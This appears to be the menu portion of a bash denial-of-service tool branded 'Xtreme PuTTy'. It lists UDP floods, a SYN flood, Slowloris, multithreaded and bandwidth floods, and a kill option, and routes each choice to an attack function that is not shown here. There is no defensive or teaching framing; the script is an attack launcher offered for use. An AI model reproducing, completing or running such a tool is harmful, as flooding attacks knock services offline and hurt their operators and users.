Take_input1()
{
clear
while :
do
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ¦¦¦             Xtreme PuTTy powered by Xtreme Inc                    ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ¦¦¦${RED}                      __  ___                     ${BLUE}                 ¦¦¦ " 
    echo -e "  ¦¦¦${RED}                      \ \/ / |_ _ _ ___ _ __  ___ ${BLUE}                 ¦¦¦ " 
    echo -e "  ¦¦¦${RED}                       >  <|  _| '_/ -_) '  \/ -_)${BLUE}                 ¦¦¦ "
    echo -e "  ¦¦¦${RED}                      /_/\_\\__ |_| \___|_|_|_\___|${BLUE}                 ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
    echo -e "  ¦¦¦  ${LIGHTBLUE}   [1] ${RED} UDP Flood     ¦ ${LIGHTBLUE}   [2] ${RED}UDP Flood B   ¦ ${LIGHTBLUE}  [3] ${RED}Xtreme FlooD${BLUE}¦¦¦"
    echo "  ¦¦¦+------------------------------------+-------------------------------¦ " 
    echo -e "  ¦¦¦  ${LIGHTBLUE}   [4] ${RED} SLOWLORIS     ¦ ${LIGHTBLUE}   [5] ${RED}Multithread Flood¦${LIGHTBLUE}[6] ${RED}Bandwidth  ${BLUE} ¦¦¦" 	
    echo "  ¦¦¦+------------------------------------+-------------------------------¦ " 
    echo -e "  ¦¦¦  ${LIGHTBLUE}   [7] ${RED} SyN Flood     ¦${LIGHTBLUE}    [8] ${RED}Kill Attacks ¦${LIGHTBLUE} [9] ${RED}Change Password${BLUE}¦¦¦"
    echo "  ¦¦¦+------------------------------------+-------------------------------¦ " 
    echo -n " Enter your menu choice [1-11]: "
    read yourch
    case $yourch in
      1) udp_flooda ;;
      2) udp_floodb ;;
      3) slap ;;
	  4) slowloris ;;
	  5) fry ;;
         6) bw ;;
         7) syn ;;
	  8) killall ;;
	  9) passwd ;;
      ex) echo "As you Command" ;  exit 1  ;;
	  end) pkill menu  ;;
      *) echo "Invalid Selection, Please make another selection" ;
         echo "Press a key. . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1